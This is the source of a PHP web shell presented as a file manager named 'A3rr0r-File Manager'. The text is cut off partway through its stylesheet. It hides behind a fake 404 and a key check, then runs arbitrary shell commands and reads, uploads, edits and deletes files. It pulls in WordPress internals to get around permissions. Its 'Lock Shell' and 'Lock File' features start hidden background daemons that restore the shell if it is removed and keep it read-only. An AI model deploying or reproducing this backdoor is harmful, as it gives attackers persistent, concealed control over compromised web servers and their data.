<?php
define('STEALTH_KEY_MD5', '5da0f1693bf5fc188993539ee12ed2fa'); // md5 of 'admin'
if (!isset($_REQUEST['key']) || md5($_REQUEST['key']) !== STEALTH_KEY_MD5) {
    header("HTTP/1.0 404 Not Found");
    die("Access Denied");
}

session_start();

define('X_FILE_MANAGER_VERSION', '0.1');
define('APP_NAME', 'A3rr0r-File Manager');
define('ENCRYPTION_KEY', 'RCnFfsCw3ItXaCn7BWvyyFE1Rxdmz');
define('MAX_UPLOAD_SIZE', 100 * 1024 * 1024); 
define('SESSION_TIMEOUT', 1800); 


if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT)) {
    session_unset();
    session_destroy();
    session_start();
}
$_SESSION['last_activity'] = time();

function encryptPath($path) {
    $iv = openssl_random_pseudo_bytes(16);
    $encrypted = openssl_encrypt($path, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
    return base64_encode($encrypted . '::' . base64_encode($iv));
}

function decryptPath($encoded) {
    try {
        $decoded = base64_decode($encoded);
        if ($decoded === false) return getcwd();
        
        $parts = explode('::', $decoded, 2);
        if (count($parts) !== 2) return getcwd();
        
        $encrypted = $parts[0];
        $iv = base64_decode($parts[1]);
        
        if (strlen($iv) !== 16) return getcwd();
        
        $decrypted = openssl_decrypt($encrypted, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
        return ($decrypted === false) ? getcwd() : $decrypted;
    } catch (Exception $e) {
        return getcwd();
    }
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function getPermissions($path) {
    if (!file_exists($path)) return '0000';
    return substr(sprintf('%04o', fileperms($path)), -4);
}

function isEditable($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $editable = ['php', 'txt', 'html', 'css', 'js', 'json', 'xml', 'md', 'sql', 'htaccess', 'ini', 'sh', 'py', 'c', 'cpp'];
    return in_array($ext, $editable);
}

function isFileLocked($path) {
    $p = getPermissions($path);
    $locked_perms = ['0444', '0555', '0000', '0400', '0500', '0440', '0550'];
    if (in_array($p, $locked_perms)) {
        return true;
    }
    
    $TmpNames = sys_get_temp_dir();
    $fn_noext  = pathinfo($path, PATHINFO_FILENAME);
    $key_shell = $TmpNames . '/.sessions/.' . base64_encode(getcwd() . $fn_noext . '-handler');

    $real_path = realpath($path);
    $key_file  = $real_path
        ? $TmpNames . '/.sessions/.' . base64_encode($real_path . '-handler')
        : '';

    $key_file2 = $TmpNames . '/.sessions/.' . base64_encode($path . '-handler');

    return file_exists($key_shell)
        || ($key_file  && file_exists($key_file))
        || file_exists($key_file2);
}

if (!isset($_SESSION['current_path']) || !@file_exists($_SESSION['current_path']) || !@is_dir($_SESSION['current_path'])) {
    $_SESSION['current_path'] = getcwd();
}

$current_path = $_SESSION['current_path'];
$message = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action']) && $_POST['action'] === 'navigate' && isset($_POST['path'])) {
        $new_path = decryptPath($_POST['path']);
        if (@file_exists($new_path) && @is_dir($new_path)) {
            $_SESSION['current_path'] = $new_path;
            $current_path = $new_path;
        } else {
            $error = "Directory does not exist.";
        }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'download' && isset($_POST['path'])) {
        $dl_path = decryptPath($_POST['path']);
        if (@file_exists($dl_path) && !@is_dir($dl_path)) {
            ob_clean();
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($dl_path) . '"');
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($dl_path));
            readfile($dl_path);
            exit;
        }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'getContent' && isset($_POST['path'])) {
        $file_path = decryptPath($_POST['path']);
        if (@file_exists($file_path) && !@is_dir($file_path)) {
            echo file_get_contents($file_path);
        } else {
            echo "Error: Cannot read file.";
        }
        exit;
    }

    if (isset($_POST['action']) && $_POST['action'] === 'executeCommand' && isset($_POST['command'])) {
        $command = $_POST['command'];
        chdir($current_path);
        $output = shell_exec($command . ' 2>&1');
        echo $output ? htmlspecialchars($output) : "Command executed with no output.";
        exit;
    }

    if (isset($_POST['saveFile']) && isset($_POST['filePath']) && isset($_POST['fileContent'])) {
        $file_path = decryptPath($_POST['filePath']);
        $file_perms = @fileperms($file_path);
        @chmod($file_path, 0666);
        if (file_put_contents($file_path, $_POST['fileContent']) !== false) {
            $message = "File saved successfully.";
        } else {
            $error = "Failed to save file.";
        }
        if ($file_perms !== false) @chmod($file_path, $file_perms);
    }

    if (isset($_POST['createFile']) && isset($_POST['newFileName'])) {
        $new_file = $current_path . DIRECTORY_SEPARATOR . $_POST['newFileName'];
        if (!file_exists($new_file)) {
            $dir_perms = @fileperms($current_path);
            @chmod($current_path, 0777);
            if (file_put_contents($new_file, '') !== false) {
                $message = "File created successfully.";
            } else {
                $error = "Failed to create file.";
            }
            if ($dir_perms !== false) @chmod($current_path, $dir_perms);
        } else {
            $error = "File already exists.";
        }
    }

    if (isset($_POST['createFolder']) && isset($_POST['newFolderName'])) {
        $new_folder = $current_path . DIRECTORY_SEPARATOR . $_POST['newFolderName'];
        if (!file_exists($new_folder)) {
            $dir_perms = @fileperms($current_path);
            @chmod($current_path, 0777);
            if (mkdir($new_folder, 0755)) {
                $message = "Folder created successfully.";
            } else {
                $error = "Failed to create folder.";
            }
            if ($dir_perms !== false) @chmod($current_path, $dir_perms);
        } else {
            $error = "Folder already exists.";
        }
    }

    if (isset($_POST['rename']) && isset($_POST['oldPath']) && isset($_POST['newName'])) {
        $old_path = decryptPath($_POST['oldPath']);
        $dir = dirname($old_path);
        $new_path = $dir . DIRECTORY_SEPARATOR . $_POST['newName'];
        
        $dir_perms = @fileperms($dir);
        @chmod($dir, 0777);
        $file_perms = @fileperms($old_path);
        @chmod($old_path, 0666);
        
        if (rename($old_path, $new_path)) {
            $message = "Renamed successfully.";
            if ($file_perms !== false) @chmod($new_path, $file_perms);
        } else {
            $error = "Failed to rename.";
            if ($file_perms !== false) @chmod($old_path, $file_perms);
        }
        if ($dir_perms !== false) @chmod($dir, $dir_perms);
    }

    if (isset($_POST['delete']) && isset($_POST['path'])) {
        $del_path = decryptPath($_POST['path']);
        $success = false;
        
        $dir = dirname($del_path);
        $dir_perms = @fileperms($dir);
        @chmod($dir, 0777);
        $file_perms = @fileperms($del_path);
        @chmod($del_path, is_dir($del_path) ? 0777 : 0666);

        if (is_dir($del_path)) {
            if (@rmdir($del_path)) {
                $success = true;
            } else {
                global $wp_filesystem;
                $wp_admin_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-admin/includes/file.php';
                if(empty($wp_filesystem) && file_exists($wp_admin_path)){
                    if (!defined('ABSPATH')) {
                        $wp_load = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-load.php';
                        if(file_exists($wp_load)) @require_once($wp_load);
                    }
                    if (defined('ABSPATH')) {
                        @require_once(ABSPATH.'/wp-admin/includes/file.php');
                        if(function_exists('WP_Filesystem')) WP_Filesystem();
                    }
                }
                
                if (!empty($wp_filesystem) && is_object($wp_filesystem) && method_exists($wp_filesystem, 'delete')) {
                    try {
                        if (@$wp_filesystem->delete($del_path, true, 'd')) {
                            $success = true;
                        }
                    } catch (Throwable $e) {}
                }
                
                if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
                    $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') 
                        ? 'rmdir /s /q ' . escapeshellarg($del_path) 
                        : 'rm -rf ' . escapeshellarg($del_path);
                    @shell_exec($cmd);
                    if (!file_exists($del_path)) $success = true;
                }
            }
            
            if ($success) {
                $message = "Directory deleted successfully.";
            } else {
                if ($file_perms !== false && file_exists($del_path)) @chmod($del_path, $file_perms);
                $error = "Failed to delete directory. It may not be empty.";
            }
        } else {
            if (@unlink($del_path)) {
                $success = true;
            } else {
                global $wp_filesystem;
                $wp_admin_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-admin/includes/file.php';
                if(empty($wp_filesystem) && file_exists($wp_admin_path)){
                    if (!defined('ABSPATH')) {
                        $wp_load = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-load.php';
                        if(file_exists($wp_load)) @require_once($wp_load);
                    }
                    if (defined('ABSPATH')) {
                        @require_once(ABSPATH.'/wp-admin/includes/file.php');
                        if(function_exists('WP_Filesystem')) WP_Filesystem();
                    }
                }
                
                if (!empty($wp_filesystem) && is_object($wp_filesystem) && method_exists($wp_filesystem, 'delete')) {
                    try {
                        if (@$wp_filesystem->delete($del_path, false, 'f')) {
                            $success = true;
                        }
                    } catch (Throwable $e) {}
                }
                
                if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
                    $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') 
                        ? 'del /f /q ' . escapeshellarg($del_path) 
                        : 'rm -f ' . escapeshellarg($del_path);
                    @shell_exec($cmd);
                    if (!file_exists($del_path)) $success = true;
                }
            }
            
            if ($success) {
                $message = "File deleted successfully.";
            } else {
                if ($file_perms !== false && file_exists($del_path)) @chmod($del_path, $file_perms);
                $error = "Failed to delete file.";
            }
        }
        if ($dir_perms !== false) @chmod($dir, $dir_perms);
    }

    if (isset($_POST['upload']) && isset($_FILES['file'])) {
        if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $tmp_name = $_FILES['file']['tmp_name'];
            $upload_path = $current_path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
            $c = @file_get_contents($tmp_name);
            $success = false;
            $dir = dirname($upload_path);
            $dir_perms = @fileperms($dir);
            $chmod_dir_success = @chmod($dir, 0777);
            
            $file_perms = false;
            $chmod_file_success = false;
            if (file_exists($upload_path)) {
                $file_perms = @fileperms($upload_path);
                $chmod_file_success = @chmod($upload_path, 0666);
            }

            if (@move_uploaded_file($tmp_name, $upload_path)) {
                $success = true;
            } 
            else {
                global $wp_filesystem;
                $wp_admin_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-admin/includes/file.php';
                if(empty($wp_filesystem) && file_exists($wp_admin_path)){
                    if (!defined('ABSPATH')) {
                        $wp_load = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-load.php';
                        if(file_exists($wp_load)) @require_once($wp_load);
                    }
                    if (defined('ABSPATH')) {
                        @require_once(ABSPATH.'/wp-admin/includes/file.php');
                        if(function_exists('WP_Filesystem')) WP_Filesystem();
                    }
                }

                if (!empty($wp_filesystem)) {
                    $chmod_file = defined('FS_CHMOD_FILE') ? FS_CHMOD_FILE : 0644;
                    if (is_object($wp_filesystem) && method_exists($wp_filesystem, 'copy')) {
                        try {
                            if (@$wp_filesystem->copy($tmp_name, $upload_path, true, $chmod_file)) {
                                $success = true;
                            }
                        } catch (Throwable $e) {}
                    }
                }
            }

            if (!$success) {
                if ($c !== false) {
                    if (@file_put_contents($upload_path, $c) !== false) {
                        $success = true;
                    } 
                    elseif (!empty($wp_filesystem) && is_object($wp_filesystem) && method_exists($wp_filesystem, 'put_contents')) {
                        try {
                            if (@$wp_filesystem->put_contents($upload_path, $c, $chmod_file ?? 0644)) {
                                $success = true;
                            }
                        } catch (Throwable $e) {}
                    }
                    elseif ($f = @fopen($upload_path, 'wb')) {
                        $w = @fwrite($f, $c);
                        @fclose($f);
                        if ($w !== false) $success = true;
                    }
                }
            }
            
            if ($file_perms !== false) @chmod($upload_path, $file_perms);
            if ($dir_perms !== false) @chmod($dir, $dir_perms);

            if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
                $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                    ? "copy /Y " . escapeshellarg($tmp_name) . " " . escapeshellarg($upload_path)
                    : "cp -f " . escapeshellarg($tmp_name) . " " . escapeshellarg($upload_path);
                @shell_exec($cmd);
                if (file_exists($upload_path)) $success = true;
            }
            
            if (!$success && isset($c) && $c !== false) {
                $tmp_save = sys_get_temp_dir() . '/' . uniqid('a3_') . '.tmp';
                if (@file_put_contents($tmp_save, $c)) {
                    if (@rename($tmp_save, $upload_path)) {
                        $success = true;
                    } elseif (function_exists('shell_exec') && is_callable('shell_exec')) {
                        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                            ? "move /Y " . escapeshellarg($tmp_save) . " " . escapeshellarg($upload_path)
                            : "mv -f " . escapeshellarg($tmp_save) . " " . escapeshellarg($upload_path);
                        @shell_exec($cmd);
                        if (file_exists($upload_path)) $success = true;
                    }
                    @unlink($tmp_save);
                }
            }
            if ($success) {
                $message = "File uploaded successfully.";
            } else {
                $dbg = [
                    'tmp' => file_exists($tmp_name)?1:0,
                    'read' => is_readable($tmp_name)?1:0,
                    'c' => ($c===false)?0:strlen($c),
                    'sh' => (function_exists('shell_exec') && is_callable('shell_exec'))?1:0,
                    'w' => is_writable(dirname($upload_path))?1:0,
                    't_save' => isset($tmp_save) && file_exists($tmp_save)?1:0
                ];
                $error = "Failed to upload file. DEBUG: " . json_encode($dbg);
            }
        } else {
            $error = "No file selected or upload error.";
        }
    }

    if (isset($_POST['changePermissions']) && isset($_POST['permPath']) && isset($_POST['permissions'])) {
        $perm_path = decryptPath($_POST['permPath']);
        if (isFileLocked($perm_path)) {
            $error = "🔒 This file is LOCKED! Chmod change is not allowed. The lock daemon will revert any changes.";
        } else {
            $octal = octdec($_POST['permissions']);
            if (chmod($perm_path, $octal)) {
                $message = "Permissions changed successfully.";
            } else {
                $error = "Failed to change permissions.";
            }
        }
    }

    if (isset($_POST['lockFile']) && isset($_POST['lockFilePath'])) {
        $flesName  = trim($_POST['lockFilePath']);
        $TmpNames  = sys_get_temp_dir();
        $cwd       = getcwd();
        $is_absolute = (strpos($flesName, '/') === 0 || strpos($flesName, '\\') === 0 || strpos($flesName, ':') === 1);
        $full_path = $is_absolute ? $flesName : $cwd . DIRECTORY_SEPARATOR . $flesName;
        $real_fles = realpath($full_path) ?: $full_path;
        $fn_noext  = pathinfo($real_fles, PATHINFO_FILENAME);
        $sessions  = $TmpNames . '/.sessions';
        $enc_text  = base64_encode($cwd . $fn_noext . '-text-file');
        $enc_hand  = base64_encode($real_fles . '-handler');
        $text_file = $sessions . '/.' . $enc_text;
        $hand_file = $sessions . '/.' . $enc_hand;

        if (file_exists($hand_file)) {
            @shell_exec('rm -rf ' . escapeshellarg($text_file));
            @shell_exec('rm -rf ' . escapeshellarg($hand_file));
        }

        @mkdir($sessions, 0755, true);

        $is_dir = is_dir($real_fles);
        if ($is_dir) {
            @shell_exec('cp -r ' . escapeshellarg($real_fles) . ' ' . escapeshellarg($text_file));
        } else {
            @shell_exec('cp ' . escapeshellarg($real_fles) . ' ' . escapeshellarg($text_file));
            if (!file_exists($text_file) && file_exists($real_fles)) {
                @file_put_contents($text_file, file_get_contents($real_fles));
            }
        }

        $dir = dirname($real_fles);
        $dir_perms = @fileperms($dir);
        @chmod($dir, 0777);
        $lock_perm = $is_dir ? 0555 : 0444;
        @chmod($real_fles, $lock_perm);
        if ($dir_perms !== false) @chmod($dir, $dir_perms);

        $handler = "\n<?php\n@ini_set(\"max_execution_time\", 0);\nwhile (True){\n    if (!file_exists(\"{$cwd}\")){\n        @mkdir(\"{$cwd}\");\n    }\n    if (!file_exists(\"{$real_fles}\")){\n        if (is_dir(\"{$text_file}\")) {\n            @shell_exec(\"cp -r \" . escapeshellarg(\"{$text_file}\") . \" \" . escapeshellarg(\"{$real_fles}\"));\n        } else {\n            \$text = base64_encode(@file_get_contents(\"{$text_file}\"));\n            @file_put_contents(\"{$real_fles}\", base64_decode(\$text));\n        }\n    }\n    \$p = gecko_perm(\"{$real_fles}\");\n    if (\$p != '0444' && \$p != '0555' && \$p != '0000'){\n        @chmod(\"{$real_fles}\", {$lock_perm});\n    }\n    sleep(1);\n}\n\nfunction gecko_perm(\$flename){\n    return substr(sprintf(\"%o\", @fileperms(\$flename)), -4);\n}\n";

        $handlers = @file_put_contents($hand_file, $handler);
        if ($handlers) {
            @shell_exec('php ' . escapeshellarg($hand_file) . ' > /dev/null 2>/dev/null &');
            $message = "🔒 Lock File activated for: " . basename($real_fles);
        } else {
            $error = "Failed to write lock handler. Check permissions on: $sessions";
        }
    }

    if (isset($_POST['lockShell'])) {
        $curFile   = trim(basename($_SERVER['SCRIPT_FILENAME']));
        $TmpNames  = sys_get_temp_dir();
        $cwd       = getcwd();

        $fn_noext  = pathinfo($curFile, PATHINFO_FILENAME);
        $sessions  = $TmpNames . '/.sessions';
        $enc_text  = base64_encode($cwd . $fn_noext . '-text');
        $enc_hand  = base64_encode($cwd . $fn_noext . '-handler');
        $text_file = $sessions . '/.' . $enc_text;
        $hand_file = $sessions . '/.' . $enc_hand;

        if (file_exists($hand_file) && file_exists($text_file)) {
            @shell_exec('rm -rf ' . escapeshellarg($text_file));
            @shell_exec('rm -rf ' . escapeshellarg($hand_file));
        }

        @mkdir($sessions, 0755, true);

        @shell_exec('cp ' . escapeshellarg($cwd . '/' . $curFile) . ' ' . escapeshellarg($text_file));

        $dir_perms = @fileperms($cwd);
        @chmod($cwd, 0777);
        @chmod($cwd . '/' . $curFile, 0444);
        if ($dir_perms !== false) @chmod($cwd, $dir_perms);

        $self_full = $cwd . '/' . $curFile;
        $handler = "\n<?php\n@ini_set(\"max_execution_time\", 0);\nwhile (True){\n    if (!file_exists(\"{$cwd}\")){\n        @mkdir(\"{$cwd}\");\n    }\n    if (!file_exists(\"{$self_full}\")){\n        \$text = base64_encode(@file_get_contents(\"{$text_file}\"));\n        @file_put_contents(\"{$self_full}\", base64_decode(\$text));\n    }\n    if (gecko_perm(\"{$self_full}\") != 0444){\n        @chmod(\"{$self_full}\", 0444);\n    }\n    sleep(1);\n}\n\nfunction gecko_perm(\$flename){\n    return substr(sprintf(\"%o\", @fileperms(\$flename)), -4);\n}\n";

        $handlers = @file_put_contents($hand_file, $handler);
        if ($handlers) {
            @shell_exec('php ' . escapeshellarg($hand_file) . ' > /dev/null 2>/dev/null &');
            $message = "🛡️ Lock Shell activated! This shell is now self-healing and read-only.";
        } else {
            $error = "Failed to write shell handler. Check sys temp dir permissions.";
        }
    }

    if (isset($_POST['unlockFile']) && isset($_POST['unlockPath'])) {
        $ul_path  = decryptPath($_POST['unlockPath']);
        $TmpNames = sys_get_temp_dir();
        $sessions = $TmpNames . '/.sessions';
        $cwd      = getcwd();

        $fn_noext   = pathinfo($ul_path, PATHINFO_FILENAME);
        $real_path  = realpath($ul_path) ?: $ul_path;

        $hand1 = $sessions . '/.' . base64_encode($cwd . $fn_noext . '-handler');
        $text1 = $sessions . '/.' . base64_encode($cwd . $fn_noext . '-text');
        $text1b= $sessions . '/.' . base64_encode($cwd . $fn_noext . '-text-file');

        $hand2 = $sessions . '/.' . base64_encode($real_path . '-handler');
        $text2 = $sessions . '/.' . base64_encode($cwd . $fn_noext . '-text-file');

        $hand3 = $sessions . '/.' . base64_encode($ul_path . '-handler');
        
        $hand4 = $sessions . '/.' . base64_encode(basename($ul_path) . '-handler');
        $hand5 = $sessions . '/.' . base64_encode($fn_noext . '-handler');

        $found = false;
        foreach ([$hand1, $hand2, $hand3, $hand4, $hand5] as $hf) {
            @shell_exec('pkill -f ' . escapeshellarg($hf) . ' 2>/dev/null');

            if (file_exists($hf)) {
                @file_put_contents($hf, '<?php exit();');
                @unlink($hf);
                $found = true;
            }
        }
        foreach ([$text1, $text1b, $text2] as $tf) {
            if (file_exists($tf)) @unlink($tf);
        }

        if (function_exists('shell_exec') && is_callable('shell_exec')) {
            @shell_exec('chattr -i ' . escapeshellarg($real_path) . ' 2>/dev/null');
            @shell_exec('chattr -i ' . escapeshellarg($ul_path) . ' 2>/dev/null');
        }

        $base_name = basename($real_path);
        if (!empty($base_name) && function_exists('shell_exec') && is_callable('shell_exec')) {
            @shell_exec("ps aux | grep -i php | grep " . escapeshellarg($base_name) . " | grep -v grep | awk '{print $2}' | xargs kill -9 2>/dev/null");
        }
		
        $dir = dirname($ul_path);
        $dir_perms = @fileperms($dir);
        @chmod($dir, 0777);
        @chmod($ul_path, is_dir($ul_path) ? 0755 : 0644);
        if ($dir_perms !== false) @chmod($dir, $dir_perms);

        if ($found) {
            $message = "🔓 File unlocked successfully: " . basename($ul_path) . " (chmod restored to 0644)";
        } else {
            $message = "🔓 Universal Unlock Applied: Immutable flags removed, external daemons killed, and permissions restored to 0644 for: " . basename($ul_path);
        }
    }
}

$breadcrumb_items = [];
$path_parts = explode(DIRECTORY_SEPARATOR, trim($current_path, DIRECTORY_SEPARATOR));

if (strpos($current_path, ':') !== false) {
    $drive = substr($current_path, 0, 3);
    $breadcrumb_items[] = ['name' => $drive, 'path' => encryptPath($drive)];
    $current_build_path = $drive;
} else {
    $breadcrumb_items[] = ['name' => 'root', 'path' => encryptPath('/')];
    $current_build_path = DIRECTORY_SEPARATOR;
}

foreach ($path_parts as $part) {
    if (empty($part) || (strpos($part, ':') !== false)) continue;
    $current_build_path .= $part . DIRECTORY_SEPARATOR;
    $breadcrumb_items[] = ['name' => $part, 'path' => encryptPath(rtrim($current_build_path, DIRECTORY_SEPARATOR))];
}

$files = [];
if (is_dir($current_path) && $handle = opendir($current_path)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry === '.' || $entry === '..') continue;
        
        $full_path = $current_path . DIRECTORY_SEPARATOR . $entry;
        $is_dir = is_dir($full_path);
        
        $files[] = [
            'name'        => $entry,
            'path'        => encryptPath($full_path),
            'isDirectory' => $is_dir,
            'size'        => $is_dir ? '-' : formatSize(filesize($full_path)),
            'permissions' => getPermissions($full_path),
            'lastModified'=> date("Y-m-d H:i:s", filemtime($full_path)),
            'isEditable'  => !$is_dir && isEditable($entry),
            'isLocked'    => isFileLocked($full_path),
            'isWritable'  => @is_writable($full_path),
        ];
    }
    closedir($handle);
}

usort($files, function ($a, $b) {
    if ($a['isDirectory'] && !$b['isDirectory']) return -1;
    if (!$a['isDirectory'] && $b['isDirectory']) return 1;
    return strcasecmp($a['name'], $b['name']);
});

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?></title>
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
    <style>
* {margin:0;padding:0;box-sizing:border-box;font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;} body {background-color:#09090b;color:#fafafa;min-height:100vh;line-height:1.5;-webkit-font-smoothing:antialiased;} .container {max-width:1200px;margin:0 auto;padding:0 20px;} .navbar {background-color:#09090b;border-bottom:1px solid #27272a;padding:16px 0;position:sticky;top:0;z-index:100;} .navbar-content {display:flex;align-items:center;justify-content:space-between;} .navbar h1 {color:#fafafa;font-size:1.5rem;font-weight:700;letter-spacing:-0.03em;} .version {font-size:0.75rem;color:#71717a;margin-left:8px;font-weight:400;} .home-btn {background-color:#18181b;border:1px solid #27272a;color:#e4e4e7;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:0.875rem;font-weight:500;text-decoration:none;display:inline-flex;align-items:center;transition:all 0.2s;} .home-btn:hover {background-color:#27272a;color:#fafafa;} .home-icon {margin-right:6px;font-size:1.1rem;} .logout-btn {margin-left:10px;color:#f87171;} .logout-btn:hover {background-color:#7f1d1d;color:#fca5a5;border-color:#991b1b;} .top-banner {text-align:center;margin:40px 0 10px 0;padding:0;font-size:2.5rem;font-weight:700;letter-spacing:-0.05em;} .text-red {color:#f87171;} .text-white {color:#71717a;} .text-green {color:#fafafa;} .social-line {text-align:center;margin-bottom:40px;font-size:0.875rem;} .social-link {text-decoration:none;display:inline-flex;align-items:center;padding:6px 16px;background-color:#18181b;border-radius:999px;border:1px solid #27272a;transition:all 0.2s;} .social-link:hover {background-color:#27272a;} .social-link .label {color:#a1a1aa;margin-right:6px;} .social-link .id {color:#f87171;font-weight:500;} .breadcrumb {display:flex;align-items:center;padding:4px 8px;margin-top:5px;overflow-x:auto;white-space:nowrap;background-color:#18181b;border-radius:6px;border:1px solid #27272a;font-size:0.95rem;line-height:1;} .breadcrumb-item {display:flex;align-items:center;} .breadcrumb-item a {color:#a1a1aa;text-decoration:none;padding:0;border-radius:2px;transition:color 0.2s;cursor:pointer;} .breadcrumb-item a:hover {color:#fafafa;background-color:#27272a;} .breadcrumb-separator {margin:0 4px;color:#52525b;font-size:0.9rem;} .breadcrumb-current {font-weight:500;padding:0;color:#fafafa;} .section {background-color:#09090b;border-radius:8px;margin-bottom:10px;} .section-header {display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;padding:6px 0;} .section-title {font-size:1.1rem;color:#fafafa;font-weight:600;letter-spacing:-0.025em;line-height:1.4;} .upload-form {display:flex;flex-wrap:wrap;gap:6px;align-items:center;background-color:#18181b;padding:6px 10px;border-radius:6px;border:1px solid #27272a;} .upload-form input[type="file"] {flex:1;min-width:250px;font-size:0.9rem;color:#a1a1aa;} .upload-form input[type="file"]::file-selector-button {background-color:#27272a;color:#fafafa;border:none;padding:4px 10px;border-radius:4px;cursor:pointer;margin-right:8px;transition:background-color 0.2s;font-weight:500;font-size:0.9rem;line-height:1;} .upload-form input[type="file"]::file-selector-button:hover {background-color:#3f3f46;} .btn {background-color:#3f3f46;color:#e4e4e7;border:1px solid #52525b;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:0.9rem;font-weight:500;transition:all 0.2s;display:inline-flex;align-items:center;gap:4px;line-height:1;} .btn:hover {background-color:#52525b;color:#fafafa;border-color:#71717a;} .btn-sm {padding:4px 8px;font-size:0.85rem;} .btn-success {background-color:#3f3f46;color:#e4e4e7;border:1px solid #52525b;} .btn-success:hover {background-color:#52525b;color:#fafafa;border-color:#71717a;} .file-table-container {overflow-x:auto;border-radius:6px;border:1px solid #27272a;background-color:#18181b;} .file-table {width:100%;border-collapse:collapse;text-align:left;} .file-table th {padding:1px 6px;font-size:0.8rem;text-transform:uppercase;letter-spacing:0.05em;font-weight:600;color:#a1a1aa;border-bottom:1px solid #27272a;line-height:1;height:18px;} .file-table tbody tr:nth-child(odd) td {background-color:#2a2a2f;} .file-table tbody tr:nth-child(even) td {background-color:#1e1e22;} .file-table td {padding:0 6px;border-bottom:1px solid #2a2a2e;color:#e4e4e7;font-size:0.8rem;line-height:1;height:18px;vertical-align:middle;max-height:18px;overflow:hidden;} .file-table tr:last-child td {border-bottom:none;} .file-table tbody tr:hover td {background-color:#3e3e48 !important;} .file-name {display:flex;align-items:center;gap:6px;} .file-name a {color:#fafafa;text-decoration:none;cursor:pointer;font-weight:500;} .file-name a:hover {text-decoration:underline;} .folder-icon {font-size:1.1rem;color:#60a5fa;display:flex;align-items:center;} .file-icon {font-size:1.1rem;color:#a1a1aa;display:flex;align-items:center;} .action-buttons {display:flex;gap:4px;} .action-btn {background:transparent;border:1px solid transparent;cursor:pointer;font-size:1rem;color:#a1a1aa;width:20px;height:20px;display:flex;align-items:center;justify-content:center;border-radius:4px;transition:all 0.2s;} .action-btn:hover {background-color:#3f3f46;color:#fafafa;border-color:#52525b;} .action-btn.btn-readonly {color:#f87171;} .action-btn.btn-readonly:hover {background-color:rgba(248,113,113,0.15);border-color:rgba(248,113,113,0.4);color:#fca5a5;} .compact-upload {display:flex;align-items:stretch;border:1px solid #3f3f46;border-radius:6px;overflow:hidden;background-color:#18181b;height:28px;} .compact-upload input[type="file"] {background:transparent;border:none;outline:none;padding:0 6px;font-size:0.8rem;color:#a1a1aa;line-height:1;height:100%;vertical-align:middle;display:flex;align-items:center;} .compact-upload input[type="file"]::file-selector-button {background-color:transparent;color:#a1a1aa;border:none;border-right:1px solid #3f3f46;padding:0 8px;height:100%;cursor:pointer;transition:background-color 0.2s;font-weight:500;font-size:0.8rem;line-height:28px;margin-right:6px;vertical-align:middle;} .compact-upload input[type="file"]::file-selector-button:hover {background-color:#27272a;color:#fafafa;} .compact-upload input.custom-file-input.writable::file-selector-button {color:#4ade80 !important;border-right-color:rgba(74,222,128,0.4) !important;} .compact-upload input.custom-file-input.readonly::file-selector-button {color:#f87171 !important;border-right-color:rgba(248,113,113,0.4) !important;} .compact-upload .upload-btn {background-color:#27272a;color:#fafafa;border:none;border-left:1px solid #3f3f46;padding:0 10px;cursor:pointer;font-size:0.8rem;font-weight:500;display:flex;align-items:center;gap:4px;transition:background-color 0.2s;white-space:nowrap;height:100%;} .compact-upload .upload-btn:hover {background-color:#3f3f46;} .terminal-container {background-color:#18181b;border-radius:8px;margin-top:32px;padding:20px;border:1px solid #27272a;} .terminal-header {color:#a1a1aa;font-size:0.8125rem;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;} .terminal-output {background-color:#09090b;color:#a1a1aa;padding:16px;height:300px;overflow-y:auto;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;border-radius:6px;margin-bottom:16px;white-space:pre-wrap;font-size:0.875rem;border:1px solid #27272a;} .terminal-input-group {display:flex;gap:10px;} .terminal-input {flex:1;background-color:#09090b;color:#fafafa;border:1px solid #27272a;padding:12px 16px;border-radius:6px;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;font-size:0.875rem;transition:border-color 0.2s;} .terminal-input:focus {border-color:#52525b;outline:none;} .modal 